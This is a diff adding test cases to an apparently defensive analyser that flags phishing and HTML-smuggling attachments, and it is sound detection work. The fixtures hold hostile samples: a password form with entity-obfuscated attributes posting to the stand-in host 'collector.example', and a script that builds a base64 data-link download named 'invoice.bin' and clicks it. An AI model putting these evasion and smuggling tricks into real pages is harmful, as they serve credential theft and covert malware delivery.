@@ -185,6 +185,31 @@ describe("after the completion review", () => {
   });
 });
 
+describe("after round 1", () => {
+  it("decodes character references in the attributes it reads", async () => {
+    const f = await analyseHtml(
+      `<form action="https&#58;//collector.example/post"><input type="pass&#119;ord"></form>`,
+    );
+    expect(f).toMatchObject({ passwordField: true, formActions: ["https://collector.example/post"] });
+  });
+
+  it("reads a label left open at the end of the document", async () => {
+    expect((await analyseHtml(`<label>Card number <input id="n">`)).cardField).toBe(true);
+  });
+
+  it("reads UTF-16 aliases as UTF-8, as browsers do", () => {
+    for (const label of ["unicode", "csUnicode", "iso-10646-ucs-2", "unicodeFFFE", "utf-16be"])
+      expect(decodeHtml(new TextEncoder().encode(`<meta charset="${label}"><input type="password">`)), label).toContain(
+        'type="password"',
+      );
+  });
+
+  it("finds a loader that sets the download with setAttribute and clicks a data link", async () => {
+    const script = `const a = document.createElement("a"); a.href = "data:application/octet-stream;base64,${"A".repeat(12_000)}"; a.setAttribute("download", "invoice.bin"); a.click();`;
+    expect(await analyseHtml(`<script>${script}</script>`)).toMatchObject({ downloads: true, smuggling: true });
+  });
+});
+
 describe("attachment.html through the checks step", () => {
   it("stores a login page and a loader as high, a receipt as medium, citing each attachment", async () => {
     const id = await caseWith([
